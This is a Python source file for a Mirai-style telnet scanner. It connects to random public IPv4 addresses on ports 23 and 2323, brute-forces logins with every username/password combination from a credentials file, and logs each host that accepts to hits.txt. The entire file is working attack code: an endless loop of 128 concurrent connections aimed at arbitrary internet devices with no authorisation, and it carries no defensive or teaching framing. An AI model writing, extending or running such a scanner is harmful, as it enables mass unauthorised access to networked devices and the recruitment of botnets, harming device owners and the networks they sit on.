import asyncio
import socket
import random
from itertools import product
from datetime import datetime

MAX_CONNS = 128
HITS_FILE = "hits.txt"
CREDS_FILE = "creds.txt"

conn_table = []
file_lock = asyncio.Lock()
cred_pairs = []

class ScannerConnection:
    def __init__(self):
        self.state = "CLOSED"
        self.dst_addr = None
        self.dst_port = 23
        self.reader = None
        self.writer = None
        self.auth_queue = []

def get_random_ip():
    reserved_prefixes = [
        "0.",        # "This" network
        "10.",       # Private network
        "100.64.",   # Carrier-grade NAT (RFC 6598)
        "127.",      # Loopback
        "169.254.",  # Link-local
        "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.",
        "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
        "192.0.0.",  # IETF Protocol Assignments
        "192.0.2.",  # TEST-NET-1
        "192.88.99.",# IPv6 to IPv4 relay
        "192.168.",  # Private network
        "198.18.", "198.19.",  # Benchmark testing
        "198.51.100.",  # TEST-NET-2
        "203.0.113.",   # TEST-NET-3
        "224.", "225.", "226.", "227.", "228.", "229.", "230.", "231.", "232.", "233.", "234.", "235.", "236.", "237.", "238.", "239.",  # Multicast
        "240.", "241.", "242.", "243.", "244.", "245.", "246.", "247.", "248.", "249.", "250.", "251.", "252.", "253.", "254.", "255."  # Reserved
    ]

    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not any(ip.startswith(prefix) for prefix in reserved_prefixes):
            return ip


def load_cred_pairs():
    with open(CREDS_FILE, "r") as f:
        lines = [line.strip() for line in f if ":" in line]
    unique_users = set()
    unique_passes = set()
    for line in lines:
        user, pw = line.split(":", 1)
        unique_users.add(user.strip())
        unique_passes.add(pw.strip())
    return list(product(unique_users, unique_passes))

async def try_connect(conn):
    try:
        conn.dst_port = 23 if random.random() > 0.1 else 2323
        conn.reader, conn.writer = await asyncio.open_connection(conn.dst_addr, conn.dst_port)
        print(f"[+] Connected to {conn.dst_addr}:{conn.dst_port}")
        await conn.writer.drain()

        for username, password in conn.auth_queue:
            print(f"    Trying {username}:{password}")
            await asyncio.sleep(0.5)
            conn.writer.write((username + "\r\n").encode())
            await conn.writer.drain()
            await asyncio.sleep(0.5)
            conn.writer.write((password + "\r\n").encode())
            await conn.writer.drain()
            await asyncio.sleep(1)
            data = await conn.reader.read(512)
            if b"$" in data or b"#" in data or b"Login" not in data:
                print(f"[VALID] {conn.dst_addr}:{conn.dst_port} -> {username}:{password}")
                await save_success(conn.dst_addr, conn.dst_port, username, password)
                break

        conn.writer.close()
        conn.state = "CLOSED"
    except Exception as e:
        print(f"[-] Failed {conn.dst_addr}:{conn.dst_port} - {e}")
        conn.state = "CLOSED"

async def save_success(ip, port, username, password):
    line = f"{ip}:{port} {username}:{password}\n"
    try:
        async with file_lock:
            with open(HITS_FILE, "a") as f:
                f.write(line)
    except Exception as e:
        print(f"[-] Failed to save hit: {e}")

async def scanner_loop():
    while True:
        for conn in conn_table:
            if conn.state == "CLOSED":
                conn.dst_addr = get_random_ip()
                conn.auth_queue = list(cred_pairs)
                conn.state = "CONNECTING"
                asyncio.create_task(try_connect(conn))
        await asyncio.sleep(0.05)

def setup():
    global conn_table, cred_pairs
    conn_table = [ScannerConnection() for _ in range(MAX_CONNS)]
    cred_pairs = load_cred_pairs()
    print(f"[+] Loaded {len(cred_pairs)} credential pairs")

def run():
    setup()
    loop = asyncio.get_event_loop()
    loop.create_task(scanner_loop())
    loop.run_forever()

if __name__ == "__main__":
    run()
